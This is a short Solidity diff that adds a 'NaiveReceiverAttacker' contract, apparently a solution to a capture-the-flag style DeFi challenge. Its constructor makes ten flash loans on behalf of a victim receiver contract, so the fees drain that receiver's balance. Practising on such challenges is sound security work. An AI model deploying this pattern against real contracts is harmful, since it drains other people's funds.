@@ -57,3 +57,15 @@ contract FlashLoanReceiver is IERC3156FlashBorrower {
     // Allow deposits of ETH
     receive() external payable {}
 }
+
+contract NaiveReceiverAttacker {
+
+    constructor(address payable pool, address victim) {
+        IERC3156FlashBorrower flashVictim = IERC3156FlashBorrower(victim);
+
+        for(uint256 i = 0; i < 10; i++) {
+            NaiveReceiverLenderPool(pool).flashLoan(flashVictim, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 1, "");
+        }
+    }
+
+}
